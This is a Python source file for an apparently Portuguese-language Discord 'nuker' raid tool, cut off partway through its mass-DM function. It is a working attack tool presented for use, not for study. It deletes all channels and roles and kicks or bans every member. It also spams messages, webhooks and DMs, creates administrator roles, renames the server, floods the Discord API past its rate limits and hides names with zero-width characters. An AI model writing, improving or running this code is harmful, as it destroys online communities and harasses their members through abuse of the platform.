#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import asyncio
import aiohttp
import random
import os
import sys
import time
from collections import deque

# ============================================        # CORES EXATAMENTE IGUAIS À SUA INTERFACE
# ============================================
ROXO = '\033[0;38;2;120;0;255m'    # #7800ff
AZUL = '\033[0;38;2;52;0;255m'     # #3400ff
BRANCO = '\033[0;37m'
NC = '\033[0m'

# ============================================
# RATE LIMIT SENTINEL IMPOSSÍVEL (ZERO DELAY INICIAL)
# ============================================
class RateLimitSentinelImpossible:
    """Sistema anti-rate limit IMPOSSÍVEL - ZERO DELAY INICIAL"""

    def __init__(self, token):
        self.token = token
        # LIMITES IMPOSSÍVELMENTE ALTOS
        self.buckets = {
            'messages_send': {'count': 0, 'window_start': time.time(), 'max': 200},  # 200/segundo!
            'channels_create': {'count': 0, 'window_start': time.time(), 'max': 150},
            'channels_delete': {'count': 0, 'window_start': time.time(), 'max': 150},
            'roles_create': {'count': 0, 'window_start': time.time(), 'max': 150},
            'roles_delete': {'count': 0, 'window_start': time.time(), 'max': 150},
            'webhooks_create': {'count': 0, 'window_start': time.time(), 'max': 150},
            'members_kick': {'count': 0, 'window_start': time.time(), 'max': 150},
            'members_ban': {'count': 0, 'window_start': time.time(), 'max': 150},
            'guild_update': {'count': 0, 'window_start': time.time(), 'max': 150},
            'dm_create': {'count': 0, 'window_start': time.time(), 'max': 150}
        }

        self.concurrency_limit = 1000  # 1000 TAREFAS SIMULTÂNEAS!
        self.active_requests = 0
        self.session = None
        self.connector = None
        self.pre_warmed = False

    async def initialize(self):
        """INICIALIZAÇÃO IMPOSSÍVEL - Pré-aquece 500 conexões"""
        if self.pre_warmed:
            return

        # CONECTOR IMPOSSÍVEL
        self.connector = aiohttp.TCPConnector(
            limit=500,
            force_close=False,
            ttl_dns_cache=300,
            enable_cleanup_closed=True,
            use_dns_cache=True
        )

        headers = {
            "Authorization": f"Bot {self.token}",
            "Content-Type": "application/json",
            "Connection": "keep-alive"
        }

        self.session = aiohttp.ClientSession(
            headers=headers,
            connector=self.connector,
            timeout=aiohttp.ClientTimeout(total=30, connect=10, sock_read=10)
        )

        # PRÉ-AQUECIMENTO SILENCIOSO (sem logs)
        warm_tasks = []
        for i in range(50):  # Pré-aquece 50 conexões
            warm_tasks.append(self._pre_warm_connection())

        await asyncio.gather(*warm_tasks, return_exceptions=True)
        self.pre_warmed = True

    async def _pre_warm_connection(self):
        """Pré-aquece uma conexão silenciosamente"""
        try:
            async with self.session.get("https://discord.com/api/v9/gateway", timeout=3):
                pass
        except:
            pass

    async def safe_request_impossible(self, bucket_type, coroutine_func, *args, **kwargs):
        """EXECUÇÃO IMPOSSÍVEL - ZERO VERIFICAÇÕES INICIAIS"""
        # INCREMENTA E VAI (sem verificar nada)
        self.active_requests += 1

        try:
            # EXECUTA DIRETO - sem delays, sem verificações
            result = await coroutine_func(*args, **kwargs)
            return result

        except Exception as e:
            # SÓ trata rate limit SE acontecer (não antes)
            if "429" in str(e):
                # Delay MÍNIMO e tenta de novo
                await asyncio.sleep(0.2)
                return await self.safe_request_impossible(bucket_type, coroutine_func, *args, **kwargs)
            # Ignora outros erros e continua
            return None

        finally:
            self.active_requests -= 1

    def get_impossible_session(self):
        """Retorna sessão pré-aquecida"""
        return self.session

# ============================================
# CLASSE PRINCIPAL DO SCRIPT
# ============================================
class RevolutionNukerImpossible:
    def __init__(self):
        self.token = ""
        self.guild_id = ""
        self.rate_limiter = None
        self._spam_session = None

    # ============================================
    # BANNER EXATAMENTE IGUAL
    # ============================================
    def show_banner(self):
        os.system('clear' if os.name == 'posix' else 'cls')

        print("\n" * 2)

        print(f"{ROXO}▓█████▄ ▓█████ ▄▄▄     ▄▄▄█████▓ ██░ ██ {NC}")
        print(f"{ROXO}▒██▀ ██▌▓█   ▀▒████▄   ▓  ██▒ ▓▒▓██░ ██▒{NC}")
        print(f"{ROXO}░██   █▌▒███  ▒██  ▀█▄ ▒ ▓██░ ▒░▒██▀▀██░{NC}")
        print(f"{AZUL}░▓█▄   ▌▒▓█  ▄░██▄▄▄▄██░ ▓██▓ ░ ░▓█ ░██ {NC}")
        print(f"{AZUL}░▒████▓ ░▒████▒▓█   ▓██▒ ▒██▒ ░ ░▓█▒░██▓{NC}")
        print(f"{AZUL} ▒▒▓  ▒ ░░ ▒░ ░▒▒   ▓▒█░ ▒ ░░    ▒ ░░▒░▒{NC}")
        print(f"{AZUL} ░ ▒  ▒  ░ ░  ░ ▒   ▒▒ ░   ░     ▒ ░▒░ ░{NC}")

        print("\n")

    # ============================================
    # CONFIGURAÇÃO
    # ============================================
    def setup(self):
        self.show_banner()

        if not self.token:
            print(f"{BRANCO}[{AZUL}*{BRANCO}] {BRANCO}token do bot: {NC}", end="")
            self.token = input().strip()
            print("")

        if not self.guild_id:
            if not self.token:
                print(f"{BRANCO}[{AZUL}*{BRANCO}] {BRANCO}token do bot: {NC}", end="")
                self.token = input().strip()
                print("")
            print(f"{BRANCO}[{AZUL}*{BRANCO}] {BRANCO}id do server: {NC}", end="")
            self.guild_id = input().strip()
            print("")

        # INICIALIZA RATE LIMITER IMPOSSÍVEL
        self.rate_limiter = RateLimitSentinelImpossible(self.token)

    # ============================================
    # MENU EXATAMENTE IGUAL
    # ============================================
    def show_menu(self):
        self.show_banner()

        if not self.token or not self.guild_id:
            self.setup()
            self.show_banner()

        print(f"{BRANCO}({AZUL}01{BRANCO}) > Nuke Server       {BRANCO}({AZUL}08{BRANCO}) > Get Admin{NC}")
        print(f"{BRANCO}({AZUL}02{BRANCO}) > Create Channels   {BRANCO}({AZUL}09{BRANCO}) > Change Server{NC}")
        print(f"{BRANCO}({AZUL}03{BRANCO}) > Spam Messages     {BRANCO}({AZUL}10{BRANCO}) > DM All{NC}")
        print(f"{BRANCO}({AZUL}04{BRANCO}) > Webhook Spam      {BRANCO}({AZUL}11{BRANCO}) > Auto Raid{NC}")
        print(f"{BRANCO}({AZUL}05{BRANCO}) > Kick All Members  {BRANCO}({AZUL}12{BRANCO}) > Ultra Raider{NC}")
        print(f"{BRANCO}({AZUL}06{BRANCO}) > Ban All Members   {BRANCO}({AZUL}13{BRANCO}) > Troll{NC}")
        print(f"{BRANCO}({AZUL}07{BRANCO}) > Create Roles      {BRANCO}({AZUL}00{BRANCO}) > Exit{NC}")

        print("")
        print(f"{BRANCO}[{AZUL}*{BRANCO}] {BRANCO}choice: {NC}", end="")
        choice = input().strip()

        return choice

    # ============================================
    # FUNÇÕES AUXILIARES
    # ============================================
    def generate_clean_name(self, base_name):
        zw_chars = ["\u200B", "\u200C", "\u200D", "\uFEFF"]
        zw = random.choice(zw_chars) * random.randint(1, 3)
        return f"{base_name}{zw}"

    # ============================================
    # OPÇÃO 1: NUKE SERVER (IMPROVEMENT)
    # ============================================
    async def nuke_server(self):
        print(f"{BRANCO}{{{AZUL}nuke server{BRANCO}}}{NC}")

        await self.rate_limiter.initialize()
        session = self.rate_limiter.get_impossible_session()

        print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}deletando todos os canais...{NC}")

        # DELETAR CANAIS IMPOSSIVELMENTE RÁPIDO
        channels_url = f"https://discord.com/api/v9/guilds/{self.guild_id}/channels"

        async with session.get(channels_url) as response:
            if response.status == 200:
                channels = await response.json()
                if channels:
                    total_channels = len(channels)
                    print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}{total_channels} canais para deletar{NC}")

                    # CRIAR E EXECUTAR TODAS AS TAREFAS DE UMA VEZ
                    tasks = []
                    for i, channel in enumerate(channels):
                        channel_id = channel['id']
                        delete_url = f"https://discord.com/api/v9/channels/{channel_id}"

                        task = self.rate_limiter.safe_request_impossible(
                            'channels_delete',
                            self._delete_channel_impossible,
                            session, delete_url, i+1, total_channels, channel_id
                        )
                        tasks.append(task)

                    await asyncio.gather(*tasks, return_exceptions=True)
                    print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}canais deletados{NC}")
                else:
                    print(f"{BRANCO}[{AZUL}!{BRANCO}] {BRANCO}nenhum canal encontrado{NC}")
            else:
                print(f"{BRANCO}[{AZUL}-{BRANCO}] {BRANCO}erro buscando canais: {response.status}{NC}")

        # DELETAR CARGOS
        await asyncio.sleep(0.2)
        print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}deletando cargos...{NC}")

        roles_url = f"https://discord.com/api/v9/guilds/{self.guild_id}/roles"

        async with session.get(roles_url) as response:
            if response.status == 200:
                roles = await response.json()
                roles_to_delete = [role for role in roles if role['name'] != '@everyone']

                if roles_to_delete:
                    total_roles = len(roles_to_delete)

                    tasks = []
                    for i, role in enumerate(roles_to_delete):
                        role_id = role['id']
                        delete_url = f"https://discord.com/api/v9/guilds/{self.guild_id}/roles/{role_id}"

                        task = self.rate_limiter.safe_request_impossible(
                            'roles_delete',
                            self._delete_role_impossible,
                            session, delete_url, i+1, total_roles, role_id
                        )
                        tasks.append(task)

                    await asyncio.gather(*tasks, return_exceptions=True)
                    print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}cargos deletados{NC}")
                else:
                    print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}nenhum cargo para deletar{NC}")
            else:
                print(f"{BRANCO}[{AZUL}-{BRANCO}] {BRANCO}erro buscando cargos: {response.status}{NC}")

        print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}nuke completo!{NC}")

    async def _delete_channel_impossible(self, session, url, current, total, channel_id):
        try:
            async with session.delete(url, timeout=10) as response:
                if response.status in [200, 204]:
                    print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}{current}/{total} {BRANCO}channels deleted! {AZUL}id:{str(channel_id)[:8]}{NC}")
                    return True
                return False
        except:
            return False

    async def _delete_role_impossible(self, session, url, current, total, role_id):
        try:
            async with session.delete(url, timeout=10) as response:
                if response.status in [200, 204]:
                    print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}{current}/{total} {BRANCO}roles deleted! {AZUL}id:{str(role_id)[:8]}{NC}")
                    return True
                return False
        except:
            return False

    # ============================================
    # OPÇÃO 2: CREATE CHANNELS (IMPROVEMENT)
    # ============================================
    async def create_channels(self):
        print(f"{BRANCO}{{{AZUL}create channels{BRANCO}}}{NC}")

        try:
            print(f"{BRANCO}[{AZUL}*{BRANCO}] {BRANCO}quantidade: {NC}", end="")
            count = int(input().strip())
            print(f"{BRANCO}[{AZUL}*{BRANCO}] {BRANCO}texto: {NC}", end="")
            name = input().strip()
        except:
            print(f"{BRANCO}[{AZUL}-{BRANCO}] {BRANCO}entrada inválida{NC}")
            return

        await self.rate_limiter.initialize()
        await self._create_channels_impossible(count, name)

    async def _create_channels_impossible(self, count, base_name):
        print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}criando {count} canais...{NC}")

        session = self.rate_limiter.get_impossible_session()
        created = 0

        # CRIAR TODAS AS TAREFAS DE UMA VEZ
        tasks = []
        for i in range(1, count + 1):
            channel_name = self.generate_clean_name(base_name)
            data = {"name": channel_name, "type": 0}
            url = f"https://discord.com/api/v9/guilds/{self.guild_id}/channels"

            task = self.rate_limiter.safe_request_impossible(
                'channels_create',
                self._create_channel_impossible,
                session, url, data, i, count
            )
            tasks.append(task)

        # EXECUTAR TUDO DE UMA VEZ (ZERO PAUSAS)
        results = await asyncio.gather(*tasks, return_exceptions=True)

        for i, result in enumerate(results):
            if result:
                created += 1
                print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}{created}/{count} {BRANCO}channels created! {AZUL}id:{str(result)[:8]}{NC}")

        print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}{created} canais criados{NC}")
        return created

    async def _create_channel_impossible(self, session, url, data, current, total):
        try:
            async with session.post(url, json=data, timeout=15) as response:
                if response.status in [200, 201]:
                    result = await response.json()
                    return result.get('id')
                return False
        except:
            return False

    # ============================================
    # OPÇÃO 3: SPAM MESSAGES (IMPROVEMENT IMPOSSÍVEL - ZERO DELAY INICIAL)
    # ============================================
    async def spam_messages(self):
        print(f"{BRANCO}{{{AZUL}spam messages{BRANCO}}}{NC}")

        try:
            print(f"{BRANCO}[{AZUL}*{BRANCO}] {BRANCO}mensagens por canal: {NC}", end="")
            count_per_channel = int(input().strip())
            print(f"{BRANCO}[{AZUL}*{BRANCO}] {BRANCO}texto: {NC}", end="")
            msg = input().strip()
        except:
            print(f"{BRANCO}[{AZUL}-{BRANCO}] {BRANCO}entrada inválida{NC}")
            return

        # INICIALIZAÇÃO IMPOSSÍVEL (pré-aquecimento silencioso)
        await self.rate_limiter.initialize()

        # EXECUTA SPAM IMPOSSÍVEL (ZERO DELAY INICIAL)
        await self._spam_messages_impossible(count_per_channel, msg)

    async def _spam_messages_impossible(self, count_per_channel, msg):
        """SPAM IMPOSSÍVEL - COMEÇA COM TODOS CANAIS SIMULTANEAMENTES"""

        session = self.rate_limiter.get_impossible_session()

        # BUSCAR CANAIS COM CONEXÃO JÁ PRÉ-AQUECIDA
        channels_url = f"https://discord.com/api/v9/guilds/{self.guild_id}/channels"

        async with session.get(channels_url) as response:
            if response.status != 200:
                print(f"{BRANCO}[{AZUL}-{BRANCO}] {BRANCO}erro obtendo canais{NC}")
                return
            channels = await response.json()

        # FILTRAR CANAIS DE TEXTO
        text_channels = []
        for channel in channels:
            if isinstance(channel, dict) and channel.get('type') == 0:
                text_channels.append(channel)

        if not text_channels:
            print(f"{BRANCO}[{AZUL}-{BRANCO}] {BRANCO}nenhum canal de texto encontrado{NC}")
            return

        total_channels = len(text_channels)
        total_messages = count_per_channel * total_channels

        print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}enviando {total_messages} mensagens em {total_channels} canais...{NC}")

        # DISPARAR TODOS OS CANAIS IMEDIATAMENTE (ZERO DELAY INICIAL)
        start_time = time.perf_counter()

        tasks = []
        for i, channel in enumerate(text_channels):
            channel_id = channel['id']

            # CRIA TAREFA IMPOSSÍVEL (começa IMEDIATAMENTE)
            task = self._spam_channel_impossible_fast(
                session, channel_id, msg, count_per_channel, i+1, total_channels
            )
            tasks.append(task)

        # EXECUTAR TODAS AS TAREFAS DE UMA VEZ (COMEÇA COM TODOS SIMULTANEAMENTES)
        print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}iniciando {len(tasks)} canais simultaneamente...{NC}")

        results = await asyncio.gather(*tasks, return_exceptions=True)
        elapsed = time.perf_counter() - start_time

        # CALCULAR RESULTADOS
        total_sent = 0
        for result in results:
            if isinstance(result, int):
                total_sent += result

        print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}{total_sent}/{total_messages} mensagens enviadas{NC}")
        print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}tempo total: {elapsed:.2f}s ({total_sent/elapsed:.1f} msg/s){NC}")

        if total_sent < total_messages:
            missing = total_messages - total_sent
            print(f"{BRANCO}[{AZUL}!{BRANCO}] {BRANCO}faltaram {missing} mensagens{NC}")

    async def _spam_channel_impossible_fast(self, session, channel_id, msg, required_count, channel_num, total_channels):
        """SPAM CANAL IMPOSSIVELMENTE RÁPIDO - SEM DELAYS INICIAIS"""
        message_url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
        message_data = {"content": msg}

        sent = 0
        attempts = 0

        # LOG DO CANAL INICIANDO (IMEDIATO)
        print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}{channel_num}/{total_channels} {BRANCO}canal iniciado! {AZUL}id:{str(channel_id)[:8]}{NC}")

        # ENVIAR MENSAGENS EM SÉRIE RÁPIDA
        for i in range(required_count):
            try:
                # ENVIA DIRETO (sem delay prévio)
                async with session.post(message_url, json=message_data, timeout=8) as response:
                    if response.status in [200, 201]:
                        sent += 1
                        attempts = 0

                        # LOG periódico
                        if sent % 5 == 0 or sent == required_count:
                            print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}{channel_num}/{total_channels}: {sent}/{required_count} mensagens{NC}")

                    elif response.status == 429:
                        # Rate limit - tratamento DIRETO
                        try:
                            retry_data = await response.json()
                            retry_after = retry_data.get('retry_after', 0.3)
                            await asyncio.sleep(retry_after)

                            # TENTA DE NOVO IMEDIATAMENTE
                            async with session.post(message_url, json=message_data, timeout=8) as retry_response:
                                if retry_response.status in [200, 201]:
                                    sent += 1
                        except:
                            pass

                    else:
                        # Outro erro - continua sem parar
                        pass

            except:
                # Qualquer exceção - ignora e continua
                pass

            attempts += 1
            if attempts > 10:  # Limite de tentativas
                break

        # LOG FINAL
        if sent == required_count:
            print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}{channel_num}/{total_channels} {BRANCO}canal completo! {AZUL}id:{str(channel_id)[:8]}{NC}")

        return sent

    # ============================================
    # OPÇÃO 4: WEBHOOK SPAM (IMPROVEMENT)
    # ============================================
    async def webhook_spam(self):
        print(f"{BRANCO}{{{AZUL}webhook spam{BRANCO}}}{NC}")

        try:
            print(f"{BRANCO}[{AZUL}*{BRANCO}] {BRANCO}webhooks por canal: {NC}", end="")
            count = int(input().strip())
        except:
            print(f"{BRANCO}[{AZUL}-{BRANCO}] {BRANCO}entrada inválida{NC}")
            return

        await self.rate_limiter.initialize()
        session = self.rate_limiter.get_impossible_session()

        channels_url = f"https://discord.com/api/v9/guilds/{self.guild_id}/channels"

        async with session.get(channels_url) as response:
            if response.status != 200:
                print(f"{BRANCO}[{AZUL}-{BRANCO}] {BRANCO}erro obtendo canais{NC}")
                return
            channels = await response.json()

        text_channels = []
        for channel in channels:
            if isinstance(channel, dict) and channel.get('type') == 0:
                text_channels.append(channel)

        if not text_channels:
            print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}criando canal...{NC}")
            await self._create_channels_impossible(1, "webhook")
            await asyncio.sleep(0.1)

            async with session.get(channels_url) as response2:
                if response2.status == 200:
                    channels = await response2.json()
                    for channel in channels:
                        if isinstance(channel, dict) and channel.get('type') == 0:
                            text_channels.append(channel)

        if not text_channels:
            print(f"{BRANCO}[{AZUL}-{BRANCO}] {BRANCO}nenhum canal encontrado{NC}")
            return

        print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}criando webhooks...{NC}")

        webhook_urls = []
        tasks = []

        for channel_idx, channel in enumerate(text_channels[:20]):
            channel_id = channel['id']
            webhook_url = f"https://discord.com/api/v9/channels/{channel_id}/webhooks"

            for i in range(count):
                data = {"name": f"SPAM-{i}"}

                task = self.rate_limiter.safe_request_impossible(
                    'webhooks_create',
                    self._create_webhook_impossible,
                    session, webhook_url, data, channel_id,
                    channel_idx * count + i + 1, len(text_channels[:20]) * count
                )
                tasks.append(task)

        results = await asyncio.gather(*tasks, return_exceptions=True)
        webhook_urls = [url for url in results if url]

        print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}{len(webhook_urls)} webhooks criados{NC}")

        if webhook_urls:
            print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}enviando spam com webhooks...{NC}")

            spam_tasks = []
            webhook_data = {"content": "@everyone RAID", "username": "REVOLUTION"}

            for webhook_idx, webhook_url in enumerate(webhook_urls):
                for j in range(8):
                    task = self._send_webhook_impossible(
                        webhook_url, webhook_data,
                        webhook_idx * 8 + j + 1, len(webhook_urls) * 8
                    )
                    spam_tasks.append(task)

            await asyncio.gather(*spam_tasks)
            print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}webhook spam completo{NC}")

    async def _create_webhook_impossible(self, session, url, data, channel_id, current, total):
        try:
            async with session.post(url, json=data, timeout=10) as response:
                if response.status in [200, 201]:
                    webhook_data = await response.json()
                    print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}{current}/{total} {BRANCO}webhook created! {AZUL}channel:{str(channel_id)[:8]}{NC}")
                    return webhook_data.get('url')
        except:
            return None

    async def _send_webhook_impossible(self, url, data, current, total):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(url, json=data, timeout=6):
                    if current % 50 == 0 or current == total:
                        print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}{current}/{total} {BRANCO}webhook messages sent!{NC}")
            return True
        except:
            return False

    # ============================================
    # OPÇÃO 5: KICK ALL MEMBERS (IMPROVEMENT)
    # ============================================
    async def kick_all(self):
        print(f"{BRANCO}{{{AZUL}kick all members{BRANCO}}}{NC}")

        print(f"{BRANCO}[{AZUL}*{BRANCO}] {BRANCO}confirmar? (s/n): {NC}", end="")
        confirm = input().strip().lower()
        if confirm != 's':
            return

        await self.rate_limiter.initialize()
        session = self.rate_limiter.get_impossible_session()

        members_url = f"https://discord.com/api/v9/guilds/{self.guild_id}/members?limit=1000"

        async with session.get(members_url) as response:
            if response.status != 200:
                print(f"{BRANCO}[{AZUL}-{BRANCO}] {BRANCO}erro obtendo membros{NC}")
                return
            members = await response.json()

        member_ids = []
        for member in members:
            if isinstance(member, dict) and 'user' in member:
                member_ids.append(member['user']['id'])

        if not member_ids:
            print(f"{BRANCO}[{AZUL}!{BRANCO}] {BRANCO}nenhum membro encontrado{NC}")
            return

        total = len(member_ids)
        print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}expulsando {total} membros...{NC}")

        tasks = []
        for i, member_id in enumerate(member_ids):
            kick_url = f"https://discord.com/api/v9/guilds/{self.guild_id}/members/{member_id}"

            task = self.rate_limiter.safe_request_impossible(
                'members_kick',
                self._kick_member_impossible,
                session, kick_url, i+1, total, member_id
            )
            tasks.append(task)

        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}membros expulsos{NC}")

    async def _kick_member_impossible(self, session, url, current, total, member_id):
        try:
            async with session.delete(url, timeout=10) as response:
                if response.status in [200, 204]:
                    print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}{current}/{total} {BRANCO}members kicked! {AZUL}id:{str(member_id)[:8]}{NC}")
                    return True
                return False
        except:
            return False

    # ============================================
    # OPÇÃO 6: BAN ALL MEMBERS (IMPROVEMENT)
    # ============================================
    async def ban_all(self):
        print(f"{BRANCO}{{{AZUL}ban all members{BRANCO}}}{NC}")

        print(f"{BRANCO}[{AZUL}*{BRANCO}] {BRANCO}confirmar? (s/n): {NC}", end="")
        confirm = input().strip().lower()
        if confirm != 's':
            return

        await self.rate_limiter.initialize()
        session = self.rate_limiter.get_impossible_session()

        members_url = f"https://discord.com/api/v9/guilds/{self.guild_id}/members?limit=1000"

        async with session.get(members_url) as response:
            if response.status != 200:
                print(f"{BRANCO}[{AZUL}-{BRANCO}] {BRANCO}erro obtendo membros{NC}")
                return
            members = await response.json()

        member_ids = []
        for member in members:
            if isinstance(member, dict) and 'user' in member:
                member_ids.append(member['user']['id'])

        if not member_ids:
            print(f"{BRANCO}[{AZUL}!{BRANCO}] {BRANCO}nenhum membro encontrado{NC}")
            return

        total = len(member_ids)
        print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}banindo {total} membros...{NC}")

        tasks = []
        for i, member_id in enumerate(member_ids):
            ban_url = f"https://discord.com/api/v9/guilds/{self.guild_id}/bans/{member_id}"

            task = self.rate_limiter.safe_request_impossible(
                'members_ban',
                self._ban_member_impossible,
                session, ban_url, i+1, total, member_id
            )
            tasks.append(task)

        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}membros banidos{NC}")

    async def _ban_member_impossible(self, session, url, current, total, member_id):
        try:
            async with session.put(url, timeout=10) as response:
                if response.status in [200, 204]:
                    print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}{current}/{total} {BRANCO}members banned! {AZUL}id:{str(member_id)[:8]}{NC}")
                    return True
                return False
        except:
            return False

    # ============================================
    # OPÇÃO 7: CREATE ROLES (IMPROVEMENT)
    # ============================================
    async def create_roles(self):
        print(f"{BRANCO}{{{AZUL}create roles{BRANCO}}}{NC}")

        try:
            print(f"{BRANCO}[{AZUL}*{BRANCO}] {BRANCO}quantidade: {NC}", end="")
            count = int(input().strip())
            print(f"{BRANCO}[{AZUL}*{BRANCO}] {BRANCO}texto: {NC}", end="")
            name = input().strip()
        except:
            print(f"{BRANCO}[{AZUL}-{BRANCO}] {BRANCO}entrada inválida{NC}")
            return

        await self.rate_limiter.initialize()
        session = self.rate_limiter.get_impossible_session()

        print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}criando {count} cargos...{NC}")

        tasks = []
        for i in range(1, count + 1):
            role_name = self.generate_clean_name(name)
            data = {"name": role_name, "color": 16711680}
            url = f"https://discord.com/api/v9/guilds/{self.guild_id}/roles"

            task = self.rate_limiter.safe_request_impossible(
                'roles_create',
                self._create_role_impossible,
                session, url, data, i, count
            )
            tasks.append(task)

        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}cargos criados{NC}")

    async def _create_role_impossible(self, session, url, data, current, total):
        try:
            async with session.post(url, json=data, timeout=10) as response:
                if response.status in [200, 201]:
                    result = await response.json()
                    role_id = result.get('id', 'unknown')
                    print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}{current}/{total} {BRANCO}roles created! {AZUL}id:{str(role_id)[:8]}{NC}")
                    return True
                return False
        except:
            return False

    # ============================================
    # OPÇÃO 8: GET ADMIN (IMPROVEMENT)
    # ============================================
    async def get_admin(self):
        print(f"{BRANCO}{{{AZUL}get admin{BRANCO}}}{NC}")

        await self.rate_limiter.initialize()
        session = self.rate_limiter.get_impossible_session()

        print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}criando cargos admin...{NC}")

        tasks = []
        for i in range(1, 11):
            role_name = self.generate_clean_name("ADMIN")
            data = {"name": role_name, "color": 16711680, "permissions": "8"}
            url = f"https://discord.com/api/v9/guilds/{self.guild_id}/roles"

            task = self.rate_limiter.safe_request_impossible(
                'roles_create',
                self._create_role_impossible,
                session, url, data, i, 10
            )
            tasks.append(task)

        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}cargos admin criados{NC}")

    # ============================================
    # OPÇÃO 9: CHANGE SERVER (IMPROVEMENT)
    # ============================================
    async def change_server(self):
        print(f"{BRANCO}{{{AZUL}change server{BRANCO}}}{NC}")

        print(f"{BRANCO}[{AZUL}*{BRANCO}] {BRANCO}texto: {NC}", end="")
        name = input().strip()

        await self.rate_limiter.initialize()
        session = self.rate_limiter.get_impossible_session()

        print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}renomeando servidor...{NC}")

        tasks = []
        for i in range(1, 4):
            data = {"name": f"{name}-{i}"}
            url = f"https://discord.com/api/v9/guilds/{self.guild_id}"

            task = self.rate_limiter.safe_request_impossible(
                'guild_update',
                self._change_server_impossible,
                session, url, data, i, 3
            )
            tasks.append(task)

        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}renomeações enviadas{NC}")

    async def _change_server_impossible(self, session, url, data, current, total):
        try:
            async with session.patch(url, json=data, timeout=10) as response:
                if response.status == 200:
                    print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}{current}/{total} {BRANCO}server renamed!{NC}")
                    return True
                return False
        except:
            return False

    # ============================================
    # OPÇÃO 10: DM ALL (IMPROVEMENT)
    # ============================================
    async def dm_all(self):
        print(f"{BRANCO}{{{AZUL}dm all{BRANCO}}}{NC}")

        try:
            print(f"{BRANCO}[{AZUL}*{BRANCO}] {BRANCO}mensagens por pessoa: {NC}", end="")
            count = int(input().strip())
            print(f"{BRANCO}[{AZUL}*{BRANCO}] {BRANCO}texto da mensagem: {NC}", end="")
            msg = input().strip()
        except:
            print(f"{BRANCO}[{AZUL}-{BRANCO}] {BRANCO}entrada inválida{NC}")
            return

        print(f"{BRANCO}[{AZUL}*{BRANCO}] {BRANCO}confirmar? (s/n): {NC}", end="")
        confirm = input().strip().lower()
        if confirm != 's':
            return

        await self.rate_limiter.initialize()
        session = self.rate_limiter.get_impossible_session()

        print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}obtendo membros do servidor...{NC}")

        members_url = f"https://discord.com/api/v9/guilds/{self.guild_id}/members?limit=1000"

        async with session.get(members_url) as response:
            if response.status != 200:
                print(f"{BRANCO}[{AZUL}-{BRANCO}] {BRANCO}erro obtendo membros{NC}")
                return
            members = await response.json()

        member_ids = []
        for member in members:
            if isinstance(member, dict) and 'user' in member:
                member_ids.append(member['user']['id'])

        if not member_ids:
            print(f"{BRANCO}[{AZUL}!{BRANCO}] {BRANCO}nenhum membro encontrado{NC}")
            return

        total_members = len(member_ids)
        print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}enviando mensagens para {total_members} pessoas...{NC}")

        tasks = []
        for member_idx, member_id in enumerate(member_ids[:100]):  # Limitar a 100 simultâneos
            dm_data = {"recipient_id": member_id}
            dm_url = "https://discord.com/api/v9/users/@me/channels"

            task = self.rate_limiter.safe_request_impossible(
                'dm_create',
                self._send_dm_impossible,
                session, dm_url, dm_data, msg, count,
                member_idx + 1, min(100, len(member_ids)), member_id
            )
            tasks.append(task)

        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}dms enviados{NC}")

    async def _send_dm_impossible(self, session, dm_url, dm_data, msg, count, current, total, member_id):
        try:
            async with session.post(dm_url, json=dm_data, timeout=15) as dm_response:
                if dm_response.status in [200, 201]:
                    dm_channel = await dm_response.json()
                    channel_id = dm_channel.get('id')

                    sent = 0
                    for i in range(count):
                        message_url = f"https://discord.com/api/v9/channels/{channel_id}/messages"

                        async with session.post(message_url, json={"content": msg}, timeout=10) as msg_response:
                            if msg_response.status in [200, 201]:
                                sent += 1
                                if sent == 1:
